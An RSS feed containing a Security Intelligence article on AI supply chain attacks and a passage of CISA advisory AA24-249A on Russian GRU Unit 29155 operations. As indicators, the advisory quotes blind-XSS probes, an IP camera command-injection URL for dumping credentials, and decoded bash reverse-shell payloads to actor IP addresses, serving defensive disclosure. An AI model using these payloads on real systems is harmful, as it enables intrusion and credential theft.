<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>Cyble</title>
<link>https://cyble.com</link>

<item>
<title>How cyber criminals are compromising AI software supply chains</title>
<link>https://securityintelligence.com/articles/cyber-criminals-compromising-ai-software-supply-chains/</link>
<guid>https://securityintelligence.com/articles/cyber-criminals-compromising-ai-software-supply-chains/</guid>
<content:encoded><![CDATA[

<p>With the adoption of artificial intelligence (AI) soaring across industries and use cases, preventing AI-driven software supply chain attacks has never been more important.</p>
<p>Recent research by SentinelOne <a href="https://www.sentinelone.com/labs/nullbulge-threat-actor-masquerades-as-hacktivist-group-rebelling-against-ai/" rel="noopener nofollow" target="_blank">exposed a new ransomware actor</a>, dubbed NullBulge, which targets software supply chains by weaponizing code in open-source repositories like Hugging Face and GitHub. The group, claiming to be a hacktivist organization motivated by an anti-AI cause, specifically targets these resources to poison data sets used in AI model training.</p>
<p>No matter whether you use mainstream AI solutions, integrate them into your existing tech stacks via <a href="https://www.ibm.com/topics/api" rel="noopener nofollow" target="_blank"><span class="resolved">application programming interfaces (APIs)</span></a> or even develop your own models from open-source foundation models, the entire AI software supply chain is now squarely in the spotlight of cyberattackers.</p>
<h2>Poisoning open-source data sets</h2>
<p><a href="https://www.ibm.com/topics/open-source" rel="noopener nofollow" target="_blank"><span class="resolved">Open-source</span></a> components play a critical role in the AI supply chain. Only the largest enterprises have access to the vast amounts of data needed to train a model from scratch, so they have to rely heavily on open-source data sets like LAION 5B or Common Corpus. The sheer size of these data sets also means it&rsquo;s extremely difficult to maintain data quality and compliance with copyright and privacy laws. By contrast, many mainstream <a href="https://www.ibm.com/topics/generative-ai" rel="noopener nofollow" target="_blank">generative AI</a> models like ChatGPT are black boxes in that they use their own curated data sets. This comes with its own set of security challenges.</p>
<p>Verticalized and proprietary models may refine open-source foundation models with additional training using their own data sets. For example, a company developing a next-generation customer service chatbot might use its previous customer communications records to create a model tailored to their specific needs. Such data has long been a target for cyber criminals, but the meteoric rise of generative AI has made it all the more attractive to nefarious actors.</p>
<p>By targeting these data sets, cyber criminals can poison them with misinformation or malicious code and data. Then, once that compromised information enters the AI model training process, we start to see a ripple effect spanning the entire AI software lifecycle. It can take thousands of hours and a vast amount of computing power to train a <a href="https://www.ibm.com/topics/large-language-models" rel="noopener nofollow" target="_blank">large language model (LLM)</a>. It&rsquo;s an enormously costly endeavor, both financially and environmentally. However, if the data sets used in the training have been compromised, chances are the whole process has to start from scratch.</p>
<a class="btn orange1 large" href="https://www.ibm.com/ai-cybersecurity">Explore AI cybersecurity solutions</a>
<h2>Other attack vectors on the rise</h2>
<p>Most AI software supply chain attacks take place through <a href="https://securityintelligence.com/articles/and-stay-out-blocking-backdoor-break-ins/" rel="noopener nofollow" target="_blank">backdoor</a> tampering methods like those mentioned above. However, that&rsquo;s certainly not the only way, especially as <a href="https://www.ibm.com/topics/cyber-attack" rel="noopener nofollow" target="_blank">cyberattacks</a> targeting AI systems become increasingly widespread and sophisticated. Another method is the flood attack, where attackers send huge amounts of non-malicious information through an AI system in an attempt to cover up something else &mdash; such as a piece of malicious code.</p>
<p>We&rsquo;re also seeing a rise in attacks against APIs, especially those lacking robust authentication procedures. APIs are essential for integrating AI into the myriad functions businesses now use it for, and while it&rsquo;s often assumed that API security is on the solution vendor, in reality, it&rsquo;s very much a shared responsibility.</p>
<p>Recent examples of AI API attacks include the <a href="https://www.zenml.io/blog/critical-security-update-for-zenml-users" rel="noopener nofollow" target="_blank">ZenML compromise</a> or the <a href="https://www.securityweek.com/nvidia-patches-high-severity-vulnerabilities-in-ai-networking-products/" rel="noopener nofollow" target="_blank">Nvidia AI Platform vulnerability</a>. While both have been addressed by their respective vendors, more will follow as cyber criminals expand and diversify attacks against software supply chains.</p>
<h2>Safeguarding your AI projects</h2>
<p>None of this should be taken as a warning to stay away from AI. After all, you wouldn&rsquo;t stop using email because of the risk of <a href="https://www.ibm.com/topics/phishing" rel="noopener nofollow" target="_blank">phishing</a> scams. What these developments do mean is that AI is now the new frontier in cyber crime, and security must be hard-baked into everything you do when developing, deploying, using and maintaining AI-powered technologies &mdash; whether they&rsquo;re your own or provided by a third-party vendor.</p>
<p>To do that, businesses need complete traceability for all components used in AI development. They also need full explainability and verification for every AI-generated output. You can&rsquo;t do that without keeping humans in the loop and putting security at the forefront of your strategy. If, however, you view AI solely as a way to save time and cut costs by laying off workers, with little regard for the consequences, then it&rsquo;s just a matter of time before disaster strikes.</p>
<p><a href="https://www.ibm.com/ai-cybersecurity">AI-powered security solutions</a> also play a critical role in countering the threats. They&rsquo;re not a replacement for talented security analysts but a powerful augmentation that helps them do what they do best on a scale that would otherwise be impossible to achieve.</p>

<p>The post <a href="https://securityintelligence.com/articles/cyber-criminals-compromising-ai-software-supply-chains/" rel="nofollow">How cyber criminals are compromising AI software supply chains</a> appeared first on <a href="https://securityintelligence.com" rel="nofollow">Security Intelligence</a>.</p>
]]></content:encoded>
<pubDate>Fri, 06 Sep 2024 13:00:00 +0000</pubDate>
<pubDate>Fri, 06 Sep 2024 13:00:00 +0000</pubDate>
</item>

<item>
<title>Russian Military Cyber Actors Target US and Global Critical Infrastructure</title>
<link>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-249a</link>
<guid>https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-249a</guid>
<content:encoded><![CDATA[
<h2><strong>Summary</strong></h2>
<p>The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and National Security Agency (NSA) assess that cyber actors affiliated with the Russian General Staff Main Intelligence Directorate (GRU) 161st Specialist Training Center (Unit 29155) are responsible for computer network operations against global targets for the purposes of espionage, sabotage, and reputational harm since at least 2020. GRU Unit 29155 cyber actors began deploying the destructive&nbsp;<a href="https://attack.mitre.org/software/S0689/" title="WhisperGate">WhisperGate</a> malware against multiple Ukrainian victim organizations as early as January 13, 2022. These cyber actors are separate from other known and more established GRU-affiliated cyber groups, such as Unit 26165 and Unit 74455.</p>
<p>To mitigate this malicious cyber activity, organizations should take the following actions today:</p>
<ul>
<li>Prioritize routine system updates and remediate known exploited vulnerabilities.</li>
<li>Segment networks to prevent the spread of malicious activity.</li>
<li>Enable phishing-resistant multifactor authentication (MFA) for all externally facing account services, especially for webmail, virtual private networks (VPNs), and accounts that access critical systems.</li>
</ul>
<p>This Cybersecurity Advisory provides tactics, techniques, and procedures (TTPs) associated with Unit 29155 cyber actors<a>—</a>both during and succeeding their deployment of WhisperGate against Ukraine—as well as further analysis (see <strong>Appendix A</strong>) of the WhisperGate malware initially published in the joint advisory,&nbsp;<a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-057a" title="Destructive Malware Targeting Organizations in Ukraine">Destructive Malware Targeting Organizations in Ukraine</a>, published February 26, 2022.</p>
<p>FBI, CISA, NSA and the following partners are releasing this joint advisory as a collective assessment of Unit 29155 cyber operations since 2020:</p>
<ul>
<li>U.S. Department of the Treasury</li>
<li>U.S. Department of State (Rewards for Justice)</li>
<li>U.S. Cyber Command Cyber National Mission Force (CNMF)</li>
<li>Netherlands Defence Intelligence and Security Service (MIVD)</li>
<li>Czech Military Intelligence (VZ)</li>
<li>Czech Republic Security Information Service (BIS)</li>
<li>German Federal Office for the Protection of the Constitution (BfV)</li>
<li>Estonian Internal Security Service (KAPO)</li>
<li>Latvian State Security Service (VDD)</li>
<li>Security Service of Ukraine (SBU)</li>
<li>Computer Emergency Response Team of Ukraine (CERT-UA)</li>
<li>Canadian Security Intelligence Service (CSIS)</li>
<li>Communications Security Establishment Canada (CSE)</li>
<li>Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC)</li>
<li>United Kingdom National Cyber Security Centre (NCSC-UK)</li>
</ul>
<p>For additional information on Russian state-sponsored malicious cyber activity and related indictments, see the recent U.S. Department of Justice (DOJ) press releases for&nbsp;<a href="https://www.justice.gov/opa/pr/russian-national-charged-conspiring-russia-military-intelligence-destroy-ukrainian" title="Russian National Charged for Conspiring with Russian Military Intelligence to Destroy Ukrainian Government Computer Systems and Data">June 26, 2024</a>, and&nbsp;<a href="https://www.justice.gov/opa/pr/five-russian-gru-officers-and-one-civilian-charged-conspiring-hack-ukrainian-government" title="Five Russian GRU Officers and One Civilian Charged for Conspiring to Hack Ukrainian Government">September 5, 2024</a>, FBI’s&nbsp;<a href="https://www.fbi.gov/investigate/cyber" title="The Cyber Threat">Cyber Crime</a> webpage, and CISA’s&nbsp;<a href="https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/russia" title="Russia Cyber Threat Overview and Advisories">Russia Cyber Threat Overview and Advisories</a> webpage.</p>
<p>Download the PDF version of this report:</p>





<div class="c-file">
    <div class="c-file__download">
    <a class="c-file__link" href="https://www.cisa.gov/sites/default/files/2024-09/aa24-249a-russian-military-cyber-actors-target-us-and-global-critical-infrastructure.pdf" target="_blank">AA24-249A Russian Military Cyber Actors Target U.S. and Global Critical Infrastructure</a>
    <span class="c-file__size">(PDF,       1.01 MB
  )</span>
  </div>
</div>
<p>For a downloadable copy of indicators of compromise (IOCs):</p>





<div class="c-file">
    <div class="c-file__download">
    <a class="c-file__link" href="https://www.cisa.gov/sites/default/files/2024-09/AA24-249A.stix_.xml" target="_blank">AA24-249A STIX XML</a>
    <span class="c-file__size">(XML,       321.47 KB
  )</span>
  </div>
</div>





<div class="c-file">
    <div class="c-file__download">
    <a class="c-file__link" href="https://www.cisa.gov/sites/default/files/2024-09/AA24-249A-Russian-Military-Cyber-Actors-Target-US-and-Global-Critical-Infrastructure.stix_.json" target="_blank">AA24-249A STIX JSON</a>
    <span class="c-file__size">(JSON,       201.39 KB
  )</span>
  </div>
</div>
<h2><strong>Technical Details</strong></h2>
<p><strong>Note:</strong> This advisory uses the <a href="https://attack.mitre.org/versions/v15/matrices/enterprise/" title="Enterprise Matrix">MITRE ATT&amp;CK® Matrix for Enterprise</a> framework, version 15. See the MITRE ATT&amp;CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques.</p>
<h3>GRU Unit 29155: Cyber Component</h3>
<p>FBI, NSA, and CISA assess Unit 29155 is responsible for attempted coups, sabotage and influence operations, and assassination attempts throughout Europe. Unit 29155 expanded their tradecraft to include offensive cyber operations since at least 2020. Unit 29155 cyber actors’ objectives appear to include the collection of information for espionage purposes, reputational harm caused by the theft and leakage of sensitive information, and systematic sabotage caused by the destruction of data [<a href="https://attack.mitre.org/versions/v15/techniques/T1485/" title="Data Destruction">T1485</a>].</p>
<p>FBI assesses the Unit 29155 cyber actors to be junior active-duty GRU officers under the direction of experienced Unit 29155 leadership. These individuals appear to be gaining cyber experience and enhancing their technical skills through conducting cyber operations and intrusions. Additionally, FBI assesses Unit 29155 cyber actors rely on non-GRU actors, including known cyber-criminals and enablers to conduct their operations.</p>
<h3>Cybersecurity Industry Tracking</h3>
<p>The cybersecurity industry provides overlapping cyber threat intelligence, IOCs, and mitigation recommendations related to Unit 29155 cyber actors. While not all encompassing, the following are the most notable threat group names related under <a href="https://attack.mitre.org/groups/G1003" title="Ember Bear">MITRE ATT&amp;CK G1003</a>&nbsp;and commonly used within the cybersecurity community.</p>
<ul>
<li>Cadet Blizzard (formerly known as DEV-0586 by Microsoft)[<a href="https://www.microsoft.com/en-us/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/" title="Destructive malware targeting Ukrainian organizations">1</a>],[<a href="https://www.microsoft.com/en-us/security/blog/2023/06/14/cadet-blizzard-emerges-as-a-novel-and-distinct-russian-threat-actor/?msockid=2383e2d882c06a751a17f64383d26b64" title="Cadet Blizzard emerges as a novel and distinct Russian threat actor">2</a>]</li>
<li>Ember Bear (also known as Bleeding Bear by CrowdStrike)[<a href="https://www.crowdstrike.com/blog/who-is-ember-bear/" title="Who is EMBER BEAR?">3</a>]</li>
<li>Frozenvista</li>
<li>UNC2589[<a href="https://cloud.google.com/blog/topics/threat-intelligence/russia-invasion-ukraine-retaliation/" title="Responses to Russia's Invasion of Ukraine Likely to Spur Retaliation">4</a>]</li>
<li>UAC-0056[<a href="https://www.sentinelone.com/blog/threat-actor-uac-0056-targeting-ukraine-with-fake-translation-software/">5</a>]</li>
</ul>
<p><strong>Note:</strong> Cybersecurity companies have different methods of tracking and attributing cyber actors, and this may not be a 1:1 correlation to the U.S. Government’s understanding for all activity related to these groupings.</p>
<h3>Victimization</h3>
<p>In addition to WhisperGate and other incidents against Ukraine, Unit 29155 cyber actors have conducted computer network operations against numerous members of the North Atlantic Treaty Organization (NATO) in Europe and North America, as well as countries in Europe, Latin America, and Central Asia. The activity includes cyber campaigns such as website defacements, infrastructure scanning, data exfiltration, and data leak operations. These actors sell or publicly release exfiltrated victim data obtained from their compromises. Since early 2022, the primary focus of the cyber actors appears to be targeting and disrupting efforts to provide aid to Ukraine.</p>
<p>To date, the FBI has observed more than 14,000 instances of domain scanning across at least 26 NATO members and several additional European Union (EU) countries. Unit 29155 cyber actors have defaced victim websites and used public website domains to post exfiltrated victim information.</p>
<p>Whether through offensive operations or scanning activity, Unit 29155 cyber actors are known to target critical infrastructure and key resource sectors, including the government services, financial services, transportation systems, energy, and healthcare sectors of NATO members, the EU, Central American, and Asian countries.</p>
<h3>TTP Overview</h3>
<h4><strong>Reconnaissance</strong></h4>
<p>Unit 29155 cyber actors have been observed targeting IP ranges [<a href="https://attack.mitre.org/versions/v15/techniques/T1595/001/" title="Active Scanning: Scanning IP Blocks">T1595.001</a>] used within multiple government and critical infrastructure organizations. The following are publicly available tools these cyber actors have used for scanning [<a href="https://attack.mitre.org/versions/v15/techniques/T1595/" title="Active Scanning">T1595</a>] and vulnerability exploit efforts. Unit 29155 cyber actors were not observed using these tools outside of their intended purpose. <strong>Note:&nbsp;</strong>Use of these tools should not be attributed as malicious without analytical evidence to support threat actor use and/or control.</p>
<ul>
<li><strong>Acunetix:</strong> Unit 29155 cyber actors leveraged both Acunetix and Nmap to identify open ports, services, and vulnerabilities for networks [<a href="https://attack.mitre.org/versions/v15/techniques/T1595/002/" title="Active Scanning: Vulnerability Scanning">T1595.002</a>].[<a href="https://www.acunetix.com/support/docs/introduction/" title="Introduction to Acunetix">6</a>]</li>
<li><strong>Amass:</strong> Unit 29155 cyber actors leveraged both Amass and VirusTotal to obtain subdomains for target websites [<a href="https://attack.mitre.org/versions/v15/techniques/T1590/002/" title="Gather Victim Network Information: DNS">T1590.002</a>].[<a href="https://github.com/owasp-amass/amass" title="owasp-amass / amass">7</a>]</li>
<li><strong>Droopescan</strong>[<a href="https://kalilinuxtutorials.com/droopescan/" title="Droopescan : A Plugin-Based Scanner That Aids Security Researchers">8</a>]</li>
<li><strong>JoomScan</strong>[<a href="https://github.com/OWASP/joomscan" title="OWASP / joomscan">9</a>]</li>
<li><strong>MASSCAN:</strong> Unit 29155 cyber actors used MASSCAN and Nmap to discover other machines once inside victim networks.[<a href="https://www.kali.org/tools/masscan/" title="Masscan">10</a>]</li>
<li><strong>Netcat</strong>[<a href="https://www.digitalocean.com/community/tutorials/how-to-use-netcat-to-establish-and-test-tcp-and-udp-connections" title="How To Use Netcat to Establish and Test TCP and UDP Connections">11</a>]</li>
<li><strong>Nmap:</strong> Once Unit 29155 cyber actors gained access to victim internal networks, they further used Nmap (via the Nmap Scripting Engine [NSE]) to write custom scripts for discovering and scanning other machines [<a href="https://attack.mitre.org/versions/v15/techniques/T1046/" title="Network Service Discovery">T1046</a>].</li>
<li><strong>Shodan:</strong> Unit 29155 cyber actors used Shodan to identify hosts with a specific set of vulnerabilities or device types [<a href="https://attack.mitre.org/versions/v15/techniques/T1596/005/" title="Search Open Technical Databases: Scan Databases">T1596.005</a>].[<a href="https://help.shodan.io/the-basics/what-is-shodan" title="What is Shodan?">12</a>]</li>
<li><strong>VirusTotal</strong>[<a href="https://docs.virustotal.com/docs/how-it-works" title="How it works">13</a>]</li>
<li><strong>WPScan</strong></li>
</ul>
<p>Additionally, Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration [<a href="https://attack.mitre.org/versions/v15/techniques/T1572/" title="Protocol Tunneling">T1572</a>] over port 1194, and in some instances, to perform Active Directory (AD) enumeration<a>. </a>Adminer in combination with <a href="https://attack.mitre.org/versions/v15/software/S0357/" title="Impacket">Impacket</a> and ldapdomaindump were tools used for gathering information on AD. Once active devices are found, Unit 29155 cyber actors look for vulnerabilities to exploit. For example, the Acunetix vulnerability scanning tool has been used for gathering information on potential vulnerabilities such as blind cross-site scripting, as shown in the following commands:</p>
<p><code>GET /index.php?log=to@example.com&gt;%0d%0abcc:009247.3183-377.3183.1bf6c.19446.2@bxss.me</code></p>
<p><code>"GET /CMS/files/log.htm HTTP/1.1" * * "(nslookup hitccruvbrumn76c1b.bxss.me||perl -e \"gethostbyname('hitccruvbrumn76c1b.bxss.me')\")"</code></p>
<p>As the cyber actors perform reconnaissance on victim networks and discover vulnerabilities within victim web servers or machines, they obtain CVE exploit scripts from GitHub repositories and use them against victim infrastructure [<a href="https://attack.mitre.org/versions/v15/techniques/T1588/005/">T1588.005</a>]. Unit 29155 cyber actors have been observed obtaining the respective exploit scripts for, but not exploiting,<strong> </strong>the following CVEs:</p>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-1472" title="CVE-2020-1472 Detail">CVE-2020-1472</a> (Microsoft: Windows Server)</li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-26084" title="CVE-2021-26084 Detail">CVE-2021-26084</a> (Atlassian Confluence Server and Data Center)</li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3156" title="CVE-2021-3156 Detail">CVE-2021-3156</a> (Red Hat: Privilege Escalation via Command Line Argument Parsing)</li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-4034" title="CVE-2021-4034 Detail">CVE-2021-4034</a> (Red Hat: Polkit Privilege Escalation)</li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-27666" title="CVE-2022-27666 Detail">CVE-2022-27666</a> (Red Hat: Heap Buffer Overflow Flaw)</li>
</ul>
<p>Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [<a href="https://attack.mitre.org/versions/v15/techniques/T1190/">T1190</a>], as detailed throughout this advisory:</p>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-33044" title="CVE-2021-33044 Detail">CVE-2021-33044</a> (Dahua Security)</li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-33045" title="CVE-2021-33045 Detail">CVE-2021-33045</a> (Dahua Security)</li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-26134" title="CVE-2022-26134 Detail">CVE-2022-26134</a> (Atlassian Confluence Server and Data Center)</li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-26138" title="CVE-2022-26138 Detail">CVE-2022-26138</a> (Atlassian Confluence Server and Data Center)</li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-3236" title="CVE-2022-3236 Detail">CVE-2022-3236</a> (Sophos: Firewall)</li>
</ul>
<h4><strong>Resource Development</strong></h4>
<p>Rather than build custom solutions, Unit 29155 cyber actors use common red teaming techniques and publicly available tools to conduct cyber operations. As a result, many TTPs overlap with those of other cyber actors, which can lead to misattribution.</p>
<p>Unit 29155 actors and their cyber-criminal affiliates commonly maintain accounts on dark web forums; this has provided the opportunity to obtain various hacker tools such as malware and malware loaders [<a href="https://attack.mitre.org/versions/v15/techniques/T1588/001/" title="Obtain Capabilities: Malware">T1588.001</a>] like Raspberry Robin and SaintBot. While Unit 29155 cyber actors are best known for their use of WhisperGate malware against Ukraine, the use of WhisperGate is not unique to the group. Technical analysis can be found in <strong>Appendix A: WhisperGate Malware Analysis</strong>.</p>
<h4><strong>Initial Access</strong></h4>
<p>Unit 29155 cyber actors are known to use VPNs to anonymize their operational activity. These cyber actors commonly attempt to exploit weaknesses in internet-facing systems, like the CVEs listed above, to initially access networks. In one instance, Unit 29155 cyber actors exploited CVE-2021-33044 and CVE-2021-33045 on Dahua IP cameras to bypass identity authentication.</p>
<h4><strong>Lateral Movement</strong></h4>
<p>Unit 29155 cyber actors have used Shodan to scan for Internet of Things (IoT) devices, using exploitation scripts to authenticate to IP cameras with default usernames and passwords [<a href="https://attack.mitre.org/versions/v15/techniques/T1078/001/" title="Valid Accounts: Default Accounts">T1078.001</a>], and exfiltrating images [<a href="https://attack.mitre.org/versions/v15/techniques/T1125/" title="Video Capture">T1125</a>] (JPG files). Attempts are then made to perform remote command execution via web to vulnerable IP cameras; if successful, cyber actors would dump configuration settings and credentials in plaintext (as shown in <strong>Table 1</strong> below) [<a href="https://attack.mitre.org/versions/v15/techniques/T1552/001/" title="Unsecured Credentials: Credentials In Files">T1552.001</a>].</p>
<p><strong>Appendix B: Indicators of Compromise</strong> lists threat actor IP addresses associated with the activity detailed in this section.</p>
<p><strong>Note:</strong> These events are independent and not correlated as a single timeline of compromise.</p>
<div>
<table class="tablesaw tablesaw-stack">
<thead>
<tr>
<th>Event</th>
<th>Victim Observation</th>
</tr>
</thead>
<tbody>
<tr>
<td>Web requests observed from victim infrastructure</td>
<td>
<p>These requests are likely intended to dump configuration settings and credentials&nbsp;[<a href="https://attack.mitre.org/versions/v15/techniques/T1003/" title="OS Credential Dumping">T1003</a>]:</p>
<p><code>hxxp://&lt;IP&gt;:&lt;port&gt;/PictureCatch.cgi?username=&lt;NAME&gt;&amp;password=%3becho%20%22%3c%21--%23include%20file=%22SYS_CFG%22--%3e%22%3etmp/Login.htm%3b&amp;data_type=1&amp;attachment=1&amp;channel=1&amp;secret=1&amp;key=PWNED</code></p>
<p><code>hxxp://&lt;IP&gt;:&lt;port&gt;/ssi.cgi/tmp/Login.htm</code></p>
</td>
</tr>
<tr>
<td>POST requests sent to victims with payloads [<a href="https://attack.mitre.org/versions/v15/techniques/T1071/001/" title="Application Layer Protocol: Web Protocols">T1071.001</a>]</td>
<td>
<p><code>"txtUser=lol&amp;txtPassword=2&amp;btConnect=Piesl%C4%93gtiesbtConnect=Piesl%C4%93gties&amp;chRemember=on&amp;txtPassword=g00dPa%24%24w0rD&amp;txtUser=$%7b@print(system(%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F179.43.175.38%2F6870%200%3E%261%22))%7d"</code></p>
<p><code>"txtUser=lol&amp;txtPassword=2&amp;btConnect=Piesl%C4%93gtiesbtConnect=Piesl%C4%93gties&amp;chRemember=on&amp;txtPassword=g00dPa%24%24w0rD&amp;txtUser=$%7b@print(system(%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F81.17.24.130%2F6870%200%3E%261%22))%7d"</code></p>
</td>
</tr>
<tr>
<td>URL encoded values from txtUser for both commands decoded to embedded bash commands</td>
<td>
<p><code>${@print(system("bash -i &gt;&amp; /dev/tcp/179.43.175.38/6870 0&gt;&amp;1"))}</code></p>
<p><code>${@print(system("bash -i &gt;&amp; /dev/tcp/81.17.24.130/6870 0&gt;&amp;1"))}</code></p>
</td>
</tr>
</tbody>
</table>
<p>In addition, incident analysis identified the general observations listed below on victim infrastructure. Each event should be considered independent and may have been used by Unit 29155 cyber actors against multiple victims at different dates and timeframes. <strong>Appendix B: Indicators of Compromise</strong> lists IOCs associated with the observations in <strong>Table 1</strong> and below.</p>
<ul>
<li>In one instance shortly following a deployment of WhisperGate malware, Unit 29155 cyber actors exfiltrated data to&nbsp;<code>mega[.]nz</code> using&nbsp;<a href="https://attack.mitre.org/versions/v15/software/S1040/" title="Rclone">Rclone</a> [<a href="https://attack.mitre.org/versions/v15/techniques/T1567/002/" title="Exfiltration Over Web Service: Exfiltration to Cloud Storage">T1567.002</a>].</li>
<li>Unit 29155 cyber actors used a Pass-the-Hash [<a href="https://attack.mitre.org/versions/v15/techniques/T1550/002/" title="Use Alternate Authentication Material: Pass the Hash">T1550.002</a>] via ProxyChains.</li>
<li>Cyber actors performed SSH and SSHPass executions.</li>
<li>Cyber actors initiated a web request and executed commands via ProxyChains. This included obtaining NT hashes via Server Message Block (SMB) using smbclient, executing Windows Management Instrumentation (WMI) with hashes, and making web requests with resources <code>i.php</code> and <code>tunnel.jsp</code>. In one instance, cyber actors used smbclient via ProxyChains to access internal network shares, and subsequently PSQL and MySQL clients to access internal databases.</li>
<li>Cyber actors used Impacket for post-exploitation and lateral movement. The script <code>secretsdump.py</code> was used from the Impacket framework to obtain domain credentials, while <code>psexec.py</code> was subsequently used to move laterally within a victim network.&nbsp;</li>
<li>Cyber actors used <code>ntlmrelayx.py</code> via Impacket and <code>krbrelayx.py</code>, which requires Impacket to function.</li>
<li>Cyber actors used <code>Responder.py</code>.</li>
<li>Cyber actors used <code>su-bruteforce</code> to brute force a selected user using the <code>su</code> command.</li>
<li>Cyber actors used <a href="https://attack.mitre.org/software/S0521/" title="BloodHound">BloodHound</a>, an open source AD reconnaissance tool that can reveal hidden relationships and identify attack paths within an AD environment.</li>
<li>Cyber actors used CrackMapExec via ProxyChains with SMB protocol targeting internal victim IP addresses. This open source post-exploitation tool automates assessing the security of large AD networks.</li>
<li>Cyber actors used <code>LinPEAS</code>, an open source script designed to automate the process of searching for potential privilege escalation vulnerabilities on a Linux victim.</li>
<li>Cyber actors used GO Simple Tunnel (GOST) (MD5: <code>896e0f54fc67d72d94b40d7885f10c51</code>) for 30 days within one incident and against additional victims on various occasions. GOST is a tunneling tool designed to establish secure connections between clients and servers, allowing for secure data transmission over untrusted networks.</li>
<li>Cyber actors used Through the Wire against a victim’s internet-facing Confluence server. Through the Wire is a proof of concept[<a href="https://github.com/jbaines-r7/through_the_wire" title="jbaines-r7 / through_the_wire">14</a>] exploit for CVE-2022-26134, an OGNL injection vulnerability allowing an unauthenticated user to execute arbitrary code on a Confluence Server or Data Center instance. All versions of Confluence Server and Data Center prior to the fixed versions listed by Atlassian are affected by this vulnerability.[<a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html" title="Confluence Server and Data Center - CVE-2022-26134 - Critical severity unauthenticated remote code execution vulnerability">15</a>] A reverse shell over HTTPS was used to communicate over listening host on port <code>8081</code>.</li>
<li>Cyber actors initiated Nmap scans on localized web servers.</li>
<li>Cyber actors performed lateral movement from compromised web servers to exploit a corporate Microsoft Windows network, commonly using <code>psexec.py</code> from the Impacket framework. The script <code>secretsdump.py</code> from the Impacket framework was used to obtain domain credentials.</li>
<li>Cyber actors may have used Raspberry Robin malware in the role of an access broker [<a href="https://attack.mitre.org/versions/v15/techniques/T1588/001/" title="Obtain Capabilities: Malware">T1588.001</a>].</li>
<li>Cyber actors targeted victims’ Microsoft Outlook Web Access (OWA) infrastructure with password spraying to obtain valid usernames and passwords [<a href="https://attack.mitre.org/versions/v15/techniques/T1110/003/" title="Brute Force: Password Spraying">T1110.003</a>].</li>
</ul>
<h3>Command and Control</h3>
<h4><strong>Infrastructure</strong></h4>
<p>Since at least 2020, Unit 29155 cyber actors have used virtual private servers (VPSs) [<a href="https://attack.mitre.org/versions/v15/techniques/T1583/003/" title="Acquire Infrastructure: Virtual Private Server">T1583.003</a>] to host their operational tools, perform reconnaissance, exploit victim infrastructure, and exfiltrate victim data. Use of VPSs are common due to the associated IP addresses not identifying their true country of origin.</p>
<h4><strong>Post-Exploitation</strong></h4>
<div class="WordSection1">
<p>When an exploit is successfully executed on a victim system, the actors can then launch a Meterpreter payload [<a href="https://attack.mitre.org/versions/v15/techniques/T1105/" title="Ingress Tool Transfer">T1105</a>], which commonly uses a reverse Transmission Control Protocol (TCP) connection to initiate communication with the threat actors’ infrastructure [<a href="https://attack.mitre.org/versions/v15/techniques/T1095/" title="Non-Application Layer Protocol">T1095</a>]. In one instance, an established reverse TCP session was observed from victim to actor infrastructure via the following ports:</p>
<ul>
<li>1234</li>
<li>1851</li>
<li>43221</li>
<li>443</li>
<li>4444</li>
<li>4688</li>
<li>5432</li>
<li>8080</li>
<li>8081</li>
<li>8082</li>
<li>8084</li>
<li>8085</li>
<li>8088</li>
<li>8089</li>
<li>8090</li>
<li>8443</li>
<li>8487</li>
<li>8888</li>
</ul>
<p>Additional observations were collected from victim engagement and analysis, including:</p>
<ul>
<li>Use of the Metasploit Framework to search for and/or access modules such as <code>mysql</code>, <code>postgres</code>, and <code>ssh</code> software and features.</li>
<li>Use of Meterpreter and Netcat to execute reverse shells over ports such as 8081.</li>
<li>Use of Impacket.</li>
<li>Use of PHP (<code>exp_door v1.0.2</code>, <code>b374k</code>, <code>WSO 4.0.5</code>) and the <a href="https://attack.mitre.org/versions/v15/software/S0598/" title="P.A.S. Webshell">P.A.S.</a> web shells [<a href="https://attack.mitre.org/versions/v15/techniques/T1505/003/" title="Server Software Component: Web Shell">T1505.003</a>], likely for initial access.</li>
<li>Use of EternalBlue.[<a href="https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010" title="Microsoft Security Bulletin MS17-010 - Critical">16</a>],[<a href="https://www.avast.com/c-eternalblue" title="What Is EternalBlue and Why Is the MS17-010 Exploit Still Relevant?">17</a>]</li>
<li>Use of reGeorg or Neo-reGeorg to set up a proxy to tunnel network traffic following compromise of a victim website, as well as use of ProxyChains to run Nmap within the network.</li>
</ul>
<h4><strong>Encrypted Communication</strong></h4>
<p>Once Unit 29155 cyber actors gain access to the victims’ internal network, the victims have observed:</p>
<ol>
<li>Using Domain Name System (DNS) tunneling tools, such as dnscat/2 and Iodine, to tunnel IPv4 network traffic [<a href="https://attack.mitre.org/versions/v15/techniques/T1071/004/" title="Application Layer Protocol: DNS">T1071.004</a>]. For example, Iodine was used to tunnel data via <code>dns.test658324901domain.me</code>.</li>
